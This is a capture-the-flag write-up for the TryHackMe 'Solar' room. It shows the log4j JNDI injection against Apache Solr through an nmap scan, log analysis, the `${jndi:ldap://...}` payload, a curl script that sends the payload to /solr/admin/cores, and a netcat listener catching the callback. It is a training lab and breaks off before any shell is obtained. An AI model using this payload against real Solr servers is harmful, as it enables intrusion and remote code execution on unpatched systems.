# CTF - [THM Solar, exploiting log4j](https://tryhackme.com/room/solar)
Nmap scan:
```
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
8983/tcp open  unknown
```

Port 8983 is interesting, navigating to the web server on this port, I found a web app running Apache Solr version 8.11.0. Apparently, this software is known to 
have the vulnerable log4j package.
<br/><br/>
![Screenshot from 2021-12-22 13-53-37](https://user-images.githubusercontent.com/59718043/147141427-ae530fa8-811d-4d3a-a664-ab908b62025e.png)

The dashboard shows indicators that the log4j package is used for the logging activity on this application.
```
-Dsolr.log.dir=/var/solr/logs
```
This machine is supplied with example log files for investigation. In one of the log files, `solr.log`, there are multiple entries of the same requests pointing to
one specific URL endpoint or path. This path is set to `/admin/cores`. Another interesting field is the `params={}`, which we can supply with user input.
```
2021-12-13 03:44:58.415 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=80
2021-12-13 03:47:53.989 INFO  (qtp1083962448-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:54.819 INFO  (qtp1083962448-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.284 INFO  (qtp1083962448-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.682 INFO  (qtp1083962448-22) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.075 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.459 INFO  (qtp1083962448-23) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.844 INFO  (qtp1083962448-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.253 INFO  (qtp1083962448-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.548 INFO  (qtp1083962448-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.758 INFO  (qtp1083962448-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:58.058 INFO  (qtp1083962448-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=1
2021-12-13 03:47:58.346 INFO  (qtp1083962448-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0

```
The URL endpoint needs to be prefaced with `solr/`. So the address where we can supply the `params` payload 
would look like this: `http://MACHINE_IP:8983/solr/admin/cores`.
<br/><br/>
The payload to abuse this log4j vulnerability looks like this: `${jndi:ldap://ATTACKERCONTROLLEDHOST}`.
This schema reaches out to an attacker controlled endpoint via the LDAP protocol and uses the Java Naming and Directory Interface (JNDI) functionality
to access external resources.
<br/><br/>
To test this theory, we're going to set up a netcat listener then make an HTTP request including the JNDI payload as part of the parameters.
```
nc -nvlp 4444
```
```bash
#!/bin/bash

read -p "LISTENER IP: " attacker
read -p "TARGET IP: " target
curl "http://${target}:8983/solr/admin/cores?foo=$\{jndi:ldap://${attacker}:4444\}"
```
Output:
```
$ bash curl.sh
LISTENER IP: 10.8.219.166
TARGET IP: 10.10.73.44
{
  "responseHeader":{
    "status":0,
    "QTime":3},
  "initFailures":{},
  "status":{}}
```
Netcat output:
```
$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.73.44 57114
0
 `
```
As expected, the output verifies that the target is in fact vulnerable. The netcat lsitener caught a connection. However, 
the payload we sent only made an LDAP request, so we haven't popped a shell yet.

```
TO BE CONTINUED
```
